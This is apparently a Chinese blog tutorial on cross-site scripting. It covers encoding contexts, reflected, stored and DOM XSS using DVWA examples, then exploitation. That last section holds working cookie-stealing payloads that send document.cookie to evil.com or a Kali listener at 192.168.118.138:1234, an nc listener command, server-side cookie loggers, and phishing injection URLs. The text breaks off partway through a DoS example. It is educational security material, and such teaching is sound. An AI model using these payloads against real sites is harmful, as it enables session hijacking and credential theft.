<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function HtmlEncode(Str)&#123;</span><br><span class="line">	var s &#x3D; &quot;&quot; </span><br><span class="line">	if(str.length &#x3D;&#x3D; 0) return &quot;&quot;;</span><br><span class="line">	s &#x3D; s.replace(&#x2F;&amp;&#x2F;g,&quot;&amp;&quot;);</span><br><span class="line">	s &#x3D; s.replace(&#x2F;&lt;&#x2F;g,&quot;&lt;&quot;);</span><br><span class="line">	s &#x3D; s.replace(&#x2F;&gt;&#x2F;g,&quot;&gt;&quot;);</span><br><span class="line">	s &#x3D; s.replace(&#x2F;\&quot;&#x2F;g,&quot;&quot;&quot;);</span><br><span class="line">	return s;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;button&quot; id&#x3D;&quot;exec_btn&quot; value&#x3D;&quot;exec&quot; onclick&#x3D;&quot;document.write(HtmlEncode(&#39;&lt;img src&#x3D;@ onerror&#x3D;alert(123)&#x2F;&gt;&#39;))&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p> 这里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HtmlEncode(&#39;&lt;img src&#x3D;@ onerror&#x3D;alert(123)&#x2F;&gt;&#39;)后的结果为 &amp;it;img src&#x3D;@ onerror&#x3D;alert(123) &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>然后点击之后就不会弹出123了</p>
<p>再看这个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;button&quot; id&#x3D;&quot;exec_btn&quot; value&#x3D;&quot;exec&quot; onclick&#x3D;&quot;doucument.write(&#39;&lt;img src&#x3D;@ onerror&#x3D;alert(123) &#x2F;&amp;gt&#39;)&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>点击这个就会弹出123了,这就是因为<strong>HTML自解码机制</strong> </p>
<p>onclick里的这段js代码出现在了HTML标签内,说明了这里的JS代码可以进行<strong>HTML形式的编码</strong></p>
<p>这种编码方式有两种</p>
<ul>
<li>进制编码:&#xH;(十六进制格式),&#D;(十进制格式),最后的分号(;)可以不要</li>
<li>HTML实体编码</li>
</ul>
<p>在JS代码执行之前,HTML形式的解码会自动解码</p>
<p>用户输入在script中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;button&quot; id&#x3D;&quot;exec_btn&quot; value&#x3D;&quot;exec&quot; &#x2F;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function $(id)&#123;return document.getElementById(id);&#125;;</span><br><span class="line">$(&#39;exec_btn&#39;).onclick &#x3D; function()&#123;</span><br><span class="line">    document.write(&#39;&lt;img src&#x3D;@ onerror&#x3D;alert(123) &#x2F;&gt;&#39;);</span><br><span class="line">    &#x2F;&#x2F;document.write(&#39;&amp;it;img src&#x3D;@ onerror&#x3D;alert(123) &#x2F;&gt;&#39;);</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>这样是可以执行弹窗的,如果输入的是注释中内容,这段HTML代码不会自解码,是因为用户输入的这段内容上下文环境是javascript,不是HTML(script标签里的内容与HTML环境无关),此时用户输入的内容要遵循javascript法则,即js编码</p>
<ul>
<li><p>Unicode形式, \uH(十六进制)</p>
</li>
<li><p>普通十六进制, \xH</p>
</li>
<li><p>纯转义 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#39;,\&quot;,&#x2F;&gt;,\&lt; 这种在特殊字符前加\进行转义</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>具备HtmlEncode功能的标签</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;iframe&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;&#x2F;noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;&#x2F;noframes&gt;</span><br><span class="line">&lt;xmp&gt;&lt;&#x2F;xmp&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;&#x2F;plaintext&gt;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>更多JavaScript的知识以后再补充</p>
</blockquote>
<h1 id="0x02-什么是XSS"><a href="#0x02-什么是XSS" class="headerlink" title="0x02  什么是XSS"></a>0x02  什么是XSS</h1><p><img src="https://pic4.zhimg.com/80/73b69fceccc68ad467e08b04c39b2417_hd.jpg"></p>
<h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序<strong>对用户的输入过滤不足而产生</strong>的。攻击者利用网站漏洞<strong>把恶意的脚本代码注入到网页中</strong>，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p>
<p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），<strong>诱使用户去访问一个包含恶意代码的 URL</strong>，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的<strong>搜索栏、用户登录口</strong>等地方，常用来<strong>窃取客户端 Cookies 或进行钓鱼欺骗</strong>。</p>
<p>反射型XSS输入点在URL上,什么是URL?看下面这张图就行了</p>
<p><img src="https://upload-images.jianshu.io/upload_images/1155692-865aa6e8904a0509.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/918"></p>
<p>代码举例(DVWA Low)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到,echo语句中,直接将GET到的参数name的值输出,并没有进行过滤,简单的输入name为这段JS代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>就会弹出窗口,内容为xss.这也是<strong>最简单</strong>的XSS测试语句</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p>
<p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先<strong>将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码</strong>。持久型 XSS 一般出现在网站<strong>留言、评论、博客日志等交互处</strong>，恶意脚本存储到客户端或者服务端的数据库中。</p>
<p>甚至还可能出现在<strong>注册和修改密码</strong>中,比如极客大挑战就出了这种题</p>
<p>代码举例(DVWA Low)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );<span class="comment">//去除空格</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );<span class="comment">//添加反斜杠</span></span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escapemysqli_real_escape_string_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>)); <span class="comment">//mysqli_real_escape_string转义特殊字符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="comment">//将输入的message和name插入进入数据库</span></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到,SQL语句仅仅做了一些简单的去除空格,删除,添加反斜杠,转义一些字符,并没有做太多对XSS的过滤,然后就把用户输入的内容插入到数据库,如果插入了一段恶意代码,就可能会导致XSS漏洞</p>
<p>在message处,输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;script&gt;</span><br></pre></td></tr></table></figure>

<p>就会弹窗,说明存在XSS,并且来回切换后,只要进入这个界面都会弹窗,说明是存储型XSS.</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM Based XSS simply means a Cross-site scripting vulnerability that appears <strong>in the DOM</strong> (<a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Document_Object_Model">Document Object Model</a>) instead of part of the HTML. <strong>In reflective and stored Cross-site scripting attacks you can see the vulnerability payload in the response page but in DOM based cross-site scripting, the HTML source code and response of the attack will be exactly the same</strong>, i.e. the payload cannot be found in the response. It can only be observed on runtime or by investigating the DOM of the page.</p>
<p>One of the biggest differences between DOM Based XSS and Reflected or Stored XSS vulnerabilities is that DOM Based XSS cannot be stopped by server-side filters. The reason is quite simple; <strong>anything written after the “#” (hash) will never be sent to the server.</strong></p>
<p>As a matter of fact, any other type of web protections such as web application firewalls, or generic framework protections like ASP.NET Request Validation will not protect you against DOM Based XSS attacks.</p>
<p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，<strong>客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行</strong>。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p>
<p>比较容易出现DOM XSS的DOM资源</p>
<ul>
<li><p>document.URL</p>
</li>
<li><p>document.documentURI</p>
</li>
<li><p>location.href</p>
</li>
<li><p>location.search</p>
</li>
<li><p>location.*</p>
</li>
<li><p>window.name</p>
</li>
<li><p>document.referrer</p>
</li>
<li><p>HTML Modification sinks</p>
</li>
<li><ul>
<li>document.write</li>
<li>(element).innerHTML</li>
</ul>
</li>
<li><p>HTML modification to behaviour change</p>
</li>
<li><ul>
<li>(element).src (in certain elements)</li>
</ul>
</li>
<li><p>Execution Related sinks</p>
</li>
<li><ul>
<li>eval</li>
<li>setTimout / setInterval</li>
<li>execScript</li>
</ul>
<p>代码举例(DVWA Low)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name&#x3D;&quot;XSS&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">			&lt;select name&#x3D;&quot;default&quot;&gt;</span><br><span class="line">				&lt;script&gt;</span><br><span class="line">					if (document.location.href.indexOf(&quot;default&#x3D;&quot;) &gt;&#x3D; 0) &#123;</span><br><span class="line">						var lang &#x3D; document.location.href.substring(document.location.href.indexOf(&quot;default&#x3D;&quot;)+8);</span><br><span class="line">						document.write(&quot;&lt;option value&#x3D;&#39;&quot; + lang + &quot;&#39;&gt;&quot; + decodeURI(lang) + &quot;&lt;&#x2F;option&gt;&quot;);</span><br><span class="line">						document.write(&quot;&lt;option value&#x3D;&#39;&#39; disabled&#x3D;&#39;disabled&#39;&gt;----&lt;&#x2F;option&gt;&quot;);</span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line">					document.write(&quot;&lt;option value&#x3D;&#39;English&#39;&gt;English&lt;&#x2F;option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value&#x3D;&#39;French&#39;&gt;French&lt;&#x2F;option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value&#x3D;&#39;Spanish&#39;&gt;Spanish&lt;&#x2F;option&gt;&quot;);</span><br><span class="line">					document.write(&quot;&lt;option value&#x3D;&#39;German&#39;&gt;German&lt;&#x2F;option&gt;&quot;);</span><br><span class="line">				&lt;&#x2F;script&gt;</span><br><span class="line">			&lt;&#x2F;select&gt;</span><br></pre></td></tr></table></figure>

<p>代码中说到没有做任何的保护措施,那么直接在URL中输入如下</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?default&#x3D;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹窗</p>
<p> 再来一个例子</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   document.write(&quot;&lt;b&gt;Current URL&lt;&#x2F;b&gt; : &quot; + document.baseURI);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>如果发送一个HTTP请求,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;test.html#&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹窗,因为上面那个JS代码会将我们在URL中输入的任何内容写入(document.write),然后在右键查看源码中却看不到我们的payload,那就说明是DOM XSS.</p>
<p>实际上,除了构造一个新事件外,还可以选择闭合掉a标签,并插入一个新的HTML标签</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&gt;&lt;img src&#x3D;# onerror&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;&#39;</span><br></pre></td></tr></table></figure>

<p>实际页面代码变成了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&#39;&#39;&gt;&lt;img src&#x3D;# onerror&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;&#39;&#39;&gt;testLink&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这个一般很难出现,但是也确实存在.在Flash中是可以嵌入ActionScript脚本的.一个最常见的Flash XSS可以这样写</p>
<p><code>getURL(&quot;javascript:alert(document.cookie)&quot;)</code></p>
<p>将Flash 嵌入页面中: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src&#x3D;&quot;http:&#x2F;&#x2F;host&#x2F;evil.swf&quot;</span><br><span class="line">pluginspage&#x3D;&quot;http:&#x2F;&#x2F;wwww.abc.com&#x2F;test&#x2F;download&#x2F;index.cgi?P1_Prod_Version&#x3D;ShockwaveFlash&quot;</span><br><span class="line">type&#x3D;&quot;application&#x2F;x-shockwave-flash&quot;</span><br><span class="line">width&#x3D;&quot;0&quot;</span><br><span class="line">height&#x3D;&quot;0&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;&#x2F;embed&gt;</span><br></pre></td></tr></table></figure>

<p>限制Flash动态脚本的最重要的参数是”allowScriptAccess”,这个参数定义了Flash能否与HTML页面进行通信.</p>
<h1 id="0x03-XSS利用"><a href="#0x03-XSS利用" class="headerlink" title="0x03 XSS利用"></a>0x03 XSS利用</h1><p>刚刚在上面已经提到过了,XSS最常利用的cookie窃取,钓鱼等.</p>
<h2 id="Cookies-窃取"><a href="#Cookies-窃取" class="headerlink" title="Cookies 窃取"></a>Cookies 窃取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">document.location&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&#x2F;cookie.asp?cookie&#x3D;&quot;+document.cookie</span><br><span class="line">new Image().src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&#x2F;cookie.asp?cookie&#x3D;&quot;+document.cookie</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&#x2F;cookie.asp?cookie&#x3D;&quot;+document.cookie&gt;&lt;&#x2F;img&gt;</span><br></pre></td></tr></table></figure>

<p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg&#x3D;Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile&#x3D;Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs&#x3D;server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile&#x3D;fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs&#x3D;nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">$log = fopen(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite($log, $cookie . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;192.168.118.138:1234&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>然后在kali的nc监听端口1234</p>
<p>nc -nvlp 1234</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;192.168.118.138:1234&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>然后就会在kali上接收到数据包</p>
<p>成功窃取cookie之后,攻击者只需要在本地修改cookie为受害者的cookie即可登录对方账号.</p>
<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><ul>
<li>重定向钓鱼</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;index.php?search&#x3D;&quot;&#39;&gt;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>HTML注入钓鱼</li>
</ul>
<p>使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;index.php?search&#x3D;&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div style&#x3D;&quot;text-align:center;&quot;&gt;&lt;form Method&#x3D;&quot;POST&quot; Action&#x3D;&quot;phishing.php&quot; Name&#x3D;&quot;form&quot;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;Login:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;login&quot; &#x2F;&gt;&lt;br &#x2F;&gt;Password:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Password&quot; type&#x3D;&quot;password&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Valid&quot; value&#x3D;&quot;Ok&quot; type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>iframe钓鱼</li>
</ul>
<p>这种方式是通过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt;</span><br></pre></td></tr></table></figure>

<p>标签嵌入远程域的一个页面实施钓鱼。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;index.php?search&#x3D;&#39;&gt;&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot; height&#x3D;&quot;100%&quot; width&#x3D;&quot;100%&quot;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Flash钓鱼</li>
</ul>
<p>将构造好的恶意flash文件传入服务器,在目标网站用&lt;object或embed&gt;标签进行引用</p>
<ul>
<li>高级钓鱼技术</li>
</ul>
<p>注入代码劫持表单,用JS编写键盘记录等.</p>
<h2 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h2><p>什么是挂马?在网页中插入一段恶意代码,利用浏览器漏洞执行任意代码的攻击方式,在黑客圈子里形象的称为”挂马”</p>
<p>一般通过篡改网页来实现,如在XSS中使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt;</span><br></pre></td></tr></table></figure>

<p>标签</p>
<h2 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(navigator.userAgent)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DOS-与-DDOS"><a href="#DOS-与-DDOS" class="headerlink" title="DOS 与 DDOS"></a>DOS 与 DDOS</h2><ul>
<li>Dos</li>
</ul>
<p>代码举例(by Incapsula)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; JavaScript Injection in &lt;img&gt; tag enabled by Persistent XSS</span><br><span class="line">&lt;img src&#x3D;&quot;&#x2F;imagename.jpg&quot;</span><br><span 